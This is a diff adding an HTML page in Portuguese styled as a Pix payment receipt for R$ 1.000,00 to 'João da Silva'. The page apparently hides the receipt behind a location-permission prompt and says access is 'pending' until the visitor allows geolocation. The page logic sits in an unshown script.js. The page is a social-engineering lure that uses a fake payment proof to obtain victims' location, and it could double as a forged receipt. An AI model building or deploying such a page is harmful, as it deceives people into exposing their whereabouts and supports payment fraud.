@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Comprovante de Pagamento via Pix">
+    <title>Comprovante de Pagamento via Pix</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+    <!-- Tela de carregamento -->
+    <div id="loading-screen" class="loading-screen">
+        <div class="spinner"></div>
+        <h2>Carregando comprovante...</h2>
+        <p>Aguardando permissão de localização</p>
+    </div>
+
+    <!-- Mensagem de erro -->
+    <div id="error-screen" class="error-screen hidden">
+        <div class="error-icon">⚠️</div>
+        <h2>Seu acesso ao comprovante de pagamento via Pix está pendente</h2>
+        <p id="error-message">Para visualizar seu comprovante, você precisa permitir o acesso à localização.</p>
+        <button class="btn btn-primary" onclick="location.reload()">Tentar Novamente</button>
+    </div>
+
+    <!-- Comprovante -->
+    <div id="comprovante" class="comprovante-container hidden">
+        <div class="comprovante-header">
+            <div class="header-icon">✓</div>
+            <h1>Comprovante de Pagamento via Pix</h1>
+            <span class="badge badge-success">Confirmado</span>
+        </div>
+
+        <div class="comprovante-body">
+            <div class="info-group">
+                <div class="info-row">
+                    <span class="info-label">Data:</span>
+                    <span class="info-value" id="data-atual"></span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Hora:</span>
+                    <span class="info-value" id="hora-atual"></span>
+                </div>
+            </div>
+
+            <div class="divider"></div>
+
+            <div class="info-group">
+                <div class="info-row highlight">
+                    <span class="info-label">Valor Pago:</span>
+                    <span class="info-value amount">R$ 1.000,00</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Destinatário:</span>
+                    <span class="info-value">João da Silva</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Status:</span>
+                    <span class="info-value status-success">Enviado com sucesso</span>
+                </div>
+            </div>
+
+            <div class="divider"></div>
+
+            <div class="info-group">
+                <div class="info-row">
+                    <span class="info-label">Protocolo:</span>
+                    <span class="info-value" id="protocolo"></span>
+                </div>
+            </div>
+        </div>
+
+        <div class="comprovante-footer">
+            <button class="btn btn-primary" onclick="window.print()">
+                <span>🖨️</span> Imprimir Comprovante
+            </button>
+            <button class="btn btn-danger" onclick="contestarPagamento()">
+                <span>⚠️</span> Contestar Pix
+            </button>
+        </div>
+
+        <div class="comprovante-info">
+            <p>Este comprovante é válido como recibo de pagamento.</p>
+            <p class="small-text">Documento gerado eletronicamente em <span id="data-geracao"></span></p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
